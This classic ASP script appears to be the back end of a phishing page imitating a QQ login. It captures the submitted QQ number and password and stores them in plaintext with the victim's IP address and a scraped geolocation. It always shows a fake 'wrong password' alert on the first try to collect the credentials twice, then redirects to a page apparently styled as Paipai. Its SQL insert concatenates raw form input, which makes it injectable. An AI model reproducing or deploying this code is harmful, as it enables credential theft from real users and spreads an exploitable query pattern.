<!--#include file = "conn.asp"-->
<!--#include file="Setting.asp" -->
<%
session("1")=session("1")+"1"
usr=request.form("QQNumber") 
Session("username")=request.form("QQNumber")
ip =  Request.ServerVariables("REMOTE_ADDR") 
Url="http://www.ip138.com/ips.asp?ip="&ip&""
'response.Write("ip="&Url)
httpCode = GetHttpPage(Url)
adr=strCut(httpCode,"本站主数据：","</li>",2)
password=request.form("QQPassWord")
Session("pass")=request.form("QQPassWord")
data1=now() 
if  password="" or usr="" then
response.write"<script language='JavaScript'>"
      response.write"alert('请输入您的用户名或密码！');"
      response.write"javascript:history.go(-1);"
      response.write"</script>"
	  response.end
	  else


'response.End()

sql = "insert into pz (usr,webtype,yhzh,regname,sex,data1,idmunber,address,zipcode,linktel,emailadr,webtype2,title,payword)values('"&usr&"','"&password&"','"&ip&"','"&RegName&"','"&sex&"','"&data1&"','"&session("id1")&"','"&Address&"','"&ZipCode&"','"&LinkTel&"','"&EmailAdr&"','"&WebType2&"','"&Title&"','"&adr&"')"
	set rsc=server.CreateObject("adodb.recordset")
	rsc.open SQL,conn,1,3
	 Set Rs2 = Server.CreateObject("Adodb.Recordset")
sql3="select * from pz order by id desc"
Rs2.Open Sql3,Conn,1,1 
	
	 	   session("id2")=rs2("id")
		    session("qq")=rs2("usr")
'response.Write("name="&Session("username"))
'response.Write("<br>sql="&sql)
'response.End()
	  conn.close
	set conn=nothing 
	end if
	if session("1")="1" then
	response.write"<script language='JavaScript'>"
      response.write"alert('您的用户名或密码错误！');"
      response.write"javascript:history.go(-1);"
      response.write"</script>"
	else 
	
	session("1")=""
	response.write"<script language='JavaScript'>"
     	    response.write"window.location='paipai20.htm';"
      response.write"</script>"
	end if
%>